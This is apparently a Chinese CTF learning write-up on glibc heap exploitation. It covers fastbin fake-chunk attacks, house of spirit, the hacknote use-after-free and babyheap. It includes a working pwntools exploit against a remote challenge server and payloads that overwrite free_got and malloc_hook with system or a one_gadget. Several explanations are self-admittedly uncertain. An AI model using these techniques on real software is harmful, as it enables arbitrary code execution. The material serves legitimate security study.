chunk2进入fastbin fd指针指向0x00 .
    payload = '/bin/sh\x00' + 'a' * 0x60 + p64(0x71) + p64(0x6020b0-3)
    edit(1,len(payload),payload)
然后修改chunk1的内容为"/bin/sh\x00"+0x60
后面的部分就是溢出了，溢出的地方就覆盖到了chunk2
来看一下heap结构
p64（0x71)其实是保持这个chunk的size不变，后面的这个0x6020ad才是我们更改的fd指针。看一下这个位置是什么
0x7f
我们的目标地址是bss段上面的那个magic
查看magic附近
0x6020b0的第三位有0x7f，那就拿来用了，可能有点不好看出来，在0x6020b0附近随便减一些，然后看一下内存就行了
既然fake chunk已经伪造成功了，那如果这个时候再把原本的chunk2申请回来会是什么样子的
这个是申请chunk2的
由于fastbin的fd指针被指向了这个地方，所以本来我们只释放了一个fastbinchunk，然后把它申请回来了，但是fastbin中还存在着一个fake
chunk，如果此时我们再申请一个chunk，就会把这个申请过来，称作fake chunk
毕竟不是真chunk，所以不会在heap中出现，但是它是真实存在的，就是index=3
可以查看一下heaparray数组
edit修改数据，对地址内容进行修改
而0x6020bd又正好在heaparray上面，那通过修改index3的数据，就可以对
0x6020bd这个位置的内容进行修改，这个时候就可以用到堆溢出了。
把index0的内容写成free_got的地址，这个偏移就是0x6020dd-0x6020b0+3 = 35
    p8(0)*35 + p64(free_got)
调试看一下
可以看到index0的地址已经被修改成free_got了。
那继续把free_got所指向的内容修改成system，这样在调用free_got的时候，就会变成调用system了，并且index1的内容是binsh
直接调用edit修改index0就行了。
## house of spirit
### 原理
通过任意地址free掉，达到改写任意地址
条件就是需要能够在目标地址附近建立一个fake chunk。通过改写fake chunk来实现getshell
先申请堆块，然后释放一个堆块到bin，可以通过修改fd指针，伪造0x7f头越过malloc检测，从而将fake chunk取出。
这样其实fake chunk指向的bss段下的内容都变成可以控制的了，如果说chunk的地址保存在bss段上，就可以通过修改fake
chunk所指向的内容来修改chunk的地址等内容。
可以劫持got表
# hacknote
之前初学堆的时候做过，重新做一遍。
## 程序分析
### add note
### delete note
### print note
## 思路
uaf漏洞，申请2个chunk，然后释放它们，但是指针没有被改动，又因为**(&notelist+i)这个地址是puts函数
这个时候如果再申请一个8空间chunk，会把刚刚释放的那个8空间chunk取回来，然后写入content，对于这个index写的是content，但是刚刚那个8空间的chunk里面存放的还是puts函数，它的puts就会被修改成content。把shell_addr写进去再通过print
note函数去调用**(&notelist+i)就变成了调用shell。
## 脚本调试
    from pwn import*
    io=remote('node4.buuoj.cn',26946)
    #io=process('./hacknote')
    def add(size,content):
      io.sendlineafter('choice :','1')
      io.sendlineafter('Note size :',str(size))
      io.sendlineafter('Content :',content)
    def delete(idx):
      io.sendlineafter('choice :','2')
      io.sendlineafter('Index :',str(idx))
    def printf(idx):
      io.sendlineafter('choice :','3')
      io.sendlineafter('Index :',str(idx))
    shell_addr=0x8048945
    add(48,'aaaa')
    add(48,'bbbb')
    #gdb.attach(io)
    delete(0)
    #gdb.attach(io)
    delete(1)
    #gdb.attach(io)
    add(8,p32(shell_addr))
    #gdb.attach(io)
    printf(0)
    io.interactive()
看看申请的2个chunk
一个index有2次申请，分别看看里面是什么东西
0x080485fb就是调用puts函数的区域
0x39的size 后面跟着61616161 aaaa
然后看一下free掉之后
再申请一个chunk写入shell_addr
我们重新申请的8空间大小的chunk的content就可以改写shell_addr,然后现在再调用一下这个被改写的成shell的puts。
`print(0)`因为当前只有一个index了
# babyheap
这题考察的是堆chunk内容中的fasrbin attack。
fastbin attack使用double free的方式先泄露出libc_base。
## 逆向分析
calloc函数分配的chunk会被清0，跟malloc有所不同。fill函数如果往同一块内存写，可以覆盖其他的chunk
内存分配的大小不能超过4096
如果通过了if(!v4)的验证，就表示chunk被calloc创建了，然后让第一行这个指针为1表示成功创建。
第二行是v3也就是chunk的size
第三行是calloc的返回值，那就是chunk的地址。
result=前面的那个指针1的时候才能说明这个chunk存在然后往下面进行数据填充
24LL*v3+a1+16的地址表示的是目标chunk的地址，然后就是把content的内容写入地址中
**问题就存在没有限制content的大小（没有指明范围），可以实现堆溢出，然后把内容写入其他的chunk的指针中**
chunk的数据结构如下
    struct malloc_chunk{
        INTERNAL_SIZE_T mchunk_prev_size; 记录被释放的相邻chunk的大小。
        INTERNAL_SIZE_T mchunk_size;      记录当前chunk的大小，chunk的大小都是8字节对齐
        struct malloc_chunk *fd;
        struct malloc_chunk *bk;
        struct malloc_chunk *fd_nextsize;
        struck malloc_chunk *bk_nextsize; 
    }
然后如果我们先申请两个chunk，然后释放掉，再申请一个chunk，这个时候就会从fastbin chunk的链表中挖走一个大小相符的chunk。
还是先判断chunk是否存在，如果存在，就把为1的那个指针为0，让其他操作的判断失败。
然后再把chunk的size为0，然后释放掉content内容的空间。
先判断，然后按照size打印content
## 思路
先使用double
free的方法，把某个chunk1的内容部分，改写成某个chunk2的地址，这样在dump的时候实际上就是调用这个地址，然后如果可以通过把chunk2的地址通过Fill函数改成backdoor的地址，在调用chunk1内容的时候，就变成了可以getshell。
然后这道题还是要泄露出libc_base。在栈溢出的时候，我们可以通过printf，put，write去打印出某个函数当时的地址，然后通过计算偏移来算出libc_base。
主要利用的是什么虽然地址是变化的，但是两者的相对位置是不变的（应该大概是这样的）
然后堆这边
    unsorted bin 的意思是还没被处理的bin，被称作堆管理器的垃圾堆，chunk被释放之后，应该是先进入unsorted bin中等待我们再次分配内存，当它不为空的时候，申请非fastbin的内存的时候，我们就会先从unsorted bin中分割或分配。
    main_arena 就是主线程的arena，就是主线程的一块区域，然后把start brk到brk这一块区域叫做堆
    堆中计算libc_base，可以使用的是unsortbin存在一个bin时fd和bk指针的特性。大概长这样
    stuck one_unsortbin{
        size;
        fd->unsorted bin head->main_arena+0x58
        bk->unsorted bin head->main_arena+0x58
    }
    然后main_arena对于libc有一个固定偏移0x3c4b20
    那如果知道fd的值就可以
    libc_base = fd_addr - 0x58 - 0x3c4b20
    但是这种时候，unsortbin中有且只能有一个bin。就申请一个大于fastbin的值，让这个chunk释放之后进入unsorted bin中
那知道堆怎么搞出libc_base之后就要思考一下，怎么实现
先申请2个fastbin大小范围的chunk，然后它们是线性排列的，由于fill函数没有指明范围，我们如果写的内容大小超过了单个fastbin大小chunk的范围，就会把内容写到下一个chunk的其他位置
    chunk1  {
        key: 0 or 1;
        size: 0x....;
        content: xxxxx;  往这边写入content，然后如果它大于size，就会往下面chunk2的key，size进行填充。这就是堆溢出，溢出的地方，在chunk上面覆盖内容和修改。
    }
    chunk2 {
        key: 0 or 1;
        size:0x....;
        content: xxxxx;
    }
现在知道了堆溢出的作用，我们的目的是求libc_base，即求unsorted bin
的fd，即要修改某个fastbin大小的chunk的内容为fd指针地址，这样在调用dump函数的时候，就可以打印出fd的值。
然后计算出libc偏移后，使用onegadget，将它写入content，最后再申请它或者dump它。
## 脚本调试
首先先进行内存的申请
    allocate(0x10) index0
    allocate(0x10) index1
    allocate(0x10) index2
    allocate(0x10) index3
    allocate(0x80) index4
前4个是fastbin大小的chunk 第五个是unsorted bin
再释放掉1 2
    free(1)
    free(2)
让这2块先去fastbin，gdb调试看一下fastbin情况
尬住了，glibc版本比较高，所以会先用tcachebins，用完之后再用fastbin，不过问题不是很大。（这边之前用kail做的，后面换成了ubuntu1604就没有问题了)
可以看到02e0->02c0
相差0x20个位置，但是明明是只申请了0x10的空间，我觉得是因为tcachebins的范围最小是0x20，所以小于0x20的chunk先进入，然后后面放空。
虽然free掉了，但是状态还是使用。应该是tcachebins的特性吧。
可以看到f2d0 的fd指向 f2c0 那就是index2的fd指针指向index1的chunk，那就来通过堆溢出尝试一下修改
由于index1 和 index2 被释放掉了
所以现在排列是
    index0 -> index3 -index4
index4的空间是0x80，如果被释放的话是进入unsorted
bin中，我们可以修改index2的chunk内容为chunk4的地址，这样就相当于chunk4被释放了，并且这个释放是在fastbins中的。就很神奇。
但是确实看不懂怎把chunk内容修改，就先调试一下看看堆溢出之后数据被放到哪儿。
`fill(0,p64(1)*8)`
我是给index0开始填充p64(1)的，可以看到从2a0开始到2d0正好8个被我填充了1，那再看一下，再往下填充1个位置啥情况
`fill(0,p64(1)*8+p8(1))`
看到被释放的index2的fd不是指向index1的chunk了，最后2位变成了01.
那就可以通过这样去修改fd指针指向chunk4.又因为需要修改size为0x20，那就写payload
`payload= p64(0)*3+p64(0x21)+p64(0)*3+p64(0x21)`这样写的话，意思就是
每个chunk 0x20，溢出到下一位
然后因为chunk3的距离差chunk4 0x80个位置，所以将最后2位修改成0x80
因为此时chunk4被free掉了，我等等还是要malloc回来使用的，但是 fastbin会检查大小，所以还要再修改一下chunk的大小，
然后再把fastbin里面的chunk1 chunk2 申请回来。
然后再申请再释放掉一个unsortedbin大小的内存，实际上就是把刚刚那个更改的fd指针指向unsorted bin head就是main_arena.
    allocate(0x10)
    allocate(0x10)
    payload = p64(0) * 3 + p64(0x91)    改写index4的size，真晕了，我gdb的时候有看到91.我看过去应该是size应该是先绕过一个fastbinsize然后再覆盖到unsortedbinsize
    fill(3,payload)   
    allocate(0x80)
    free(4)   把我们刚刚一直再搞的那个东西给free掉，这样实际上是把那个0x80的放进了unsorted bin 是实际上
    dump(2)   调用dump打印出fd的地址
后面就是接收fd的地址(main_arena+0x58地址)然后计算libc_base
然后把shell=onegadget+libc_base
接下来就是如何调用这个shell，通过malloc_hook上方错位构造大小0x60的chunk，然后把malloc_hook的地址改写成shell的地址，这样在调用添加函数的calloc的时候就可以调用到shell。
先把chunk4 malloc回来，然后修改成我们下一个申请chunk的地址，但是又因为chunk2
的fd是chunk4的地址，所以第一次calloc0x10的时候是一句把chunk2给了index1，第二次calloc0x10的时候就把chunk4给index2了，因为fastbin单链表的特点，那么index2
4其实都是在使用chunk4
    allocate(0x60)
    allocate(0x60)        看不懂啊，这个申请0x60，然后改它的末位位0.可能是malloc函数的函数结构太不熟悉了
    payload = p8(0)*3     估计涉及到malloc_hook的一些结构。
    payload += p64(0)*2
    payload += p64(libc_base+0x4526a)
    fill(6, payload)
    allocate(0x80)